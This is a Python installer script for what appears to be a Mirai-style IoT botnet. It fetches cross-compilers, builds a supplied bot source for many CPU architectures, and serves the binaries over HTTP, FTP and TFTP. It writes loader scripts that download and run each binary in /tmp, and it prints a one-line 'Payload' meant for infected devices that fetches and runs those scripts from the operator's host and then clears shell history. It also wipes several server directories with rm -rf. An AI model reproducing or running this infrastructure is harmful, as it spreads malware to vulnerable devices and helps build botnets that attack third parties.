import subprocess, sys

def run(cmd):
    subprocess.call(cmd, shell=True)

# Validate Arguments
if len(sys.argv) < 3:
    print("\x1b[1;95mUsage: python3 sakura_installer.py <bot_file.c> <your_ip>\x1b[0m")
    sys.exit(1)

bot = sys.argv[1]
ip = sys.argv[2]

# Prompt User
Sakura = input("\x1b[1;95mReady To Install Cross Compilers? (Press Enter): \x1b[0m")
get_arch = Sakura.strip() == ""

# Compiler Filenames & URLs
compileas = ["m-i.p-s.Sakura", "m-p.s-l.Sakura", "s-h.4-.Sakura", "x-8.6-.Sakura",
             "a-r.m-6.Sakura", "x-3.2-.Sakura", "a-r.m-7.Sakura", "p-p.c-.Sakura",
             "i-5.8-6.Sakura", "m-6.8-k.Sakura", "p-p.c-.Sakura",
             "a-r.m-4.Sakura", "a-r.m-5.Sakura"]

getarch = [
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2',
    'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2',
    'https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2'
]

ccs = [arch.split('/')[-1].replace('.tar.bz2', '') for arch in getarch]

# Clear Output Dirs
run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

# Get Cross Compilers
if get_arch:
    run("rm -rf cross-compiler-*")
    for arch in getarch:
        run(f"wget {arch} --no-check-certificate -q")
    run("for f in *.tar.bz2; do tar -xf \"$f\" && rm \"$f\"; done")

# Compile
for i, cc in enumerate(ccs):
    arch = cc.split("-")[-1]
    run(f"./{cc}/bin/{arch}-gcc -static -pthread -D{arch.upper()} -o {compileas[i]} {bot} > /dev/null 2>&1")

# Install services
run("apt update -y")
run("apt install apache2 tftpd-hpa vsftpd xinetd -y")

# Configure services
with open('/etc/xinetd.d/tftp', 'w') as f:
    f.write(f"""service tftp
{{
    socket_type     = dgram
    protocol        = udp
    wait            = yes
    user            = nobody
    server          = /usr/sbin/in.tftpd
    server_args     = -s /var/lib/tftpboot
    disable         = no
}}""")

with open('/etc/vsftpd.conf', 'w') as f:
    f.write(f"""listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address={ip}
listen_port=21""")

# Enable services
run("systemctl restart apache2")
run("systemctl restart xinetd")
run("systemctl restart vsftpd")

# Copy binaries to servers
for i in compileas:
    run(f"cp {i} /var/www/html")
    run(f"cp {i} /var/ftp")
    run(f"mv {i} /var/lib/tftpboot")

# Create Payload Scripts
run('echo -e "#!/bin/bash\nulimit -n 1024\ncp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp1.sh')
run('echo -e "#!/bin/bash\nulimit -n 1024\ncp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp2.sh')
run('echo -e "#!/bin/bash" > /var/www/html/Sakura.sh')

for i in compileas:
    run(f'echo -e "cd /tmp; wget http://{ip}/{i}; chmod +x {i}; ./{i}; rm -rf {i}" >> /var/www/html/Sakura.sh')
    run(f'echo -e "cd /tmp; ftpget -v -u anonymous -p anonymous -P 21 {ip} {i} {i}; chmod 777 {i}; ./{i}; rm -rf {i}" >> /var/ftp/ftp1.sh')
    run(f'echo -e "cd /tmp; tftp {ip} -c get {i}; chmod +x {i}; ./{i}" >> /var/lib/tftpboot/tftp1.sh')
    run(f'echo -e "cd /tmp; tftp -g {ip} -r {i}; chmod +x {i}; ./{i}" >> /var/lib/tftpboot/tftp2.sh')

run("chmod +x /var/lib/tftpboot/*.sh /var/www/html/Sakura.sh")
run("systemctl restart xinetd apache2 vsftpd")

run('echo "ulimit -n 99999" >> ~/.bashrc')

# Output Payload
print(f"\x1b[1;95mPayload: cd /tmp; wget http://{ip}/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g {ip} -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c\x1b[0m")
